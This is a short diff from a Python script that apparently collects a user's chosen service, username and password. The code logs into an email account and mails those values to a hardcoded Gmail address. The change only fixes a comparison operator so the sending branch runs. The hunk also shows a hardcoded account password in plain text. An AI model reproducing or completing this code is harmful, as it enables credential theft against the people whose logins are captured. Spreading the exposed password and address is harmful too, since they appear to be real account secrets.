@@ -84,7 +84,7 @@ kl = '@zedeyep4w0rd'
 s.login(sa, kl) 
 
 ra = 'bertranddupont885@gmail.com'
-if option =! 4:
+if option != 4:
  connexion = cho + ' - ' + usn + ' - ' + usp
  msg = MIMEMultipart()
  msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
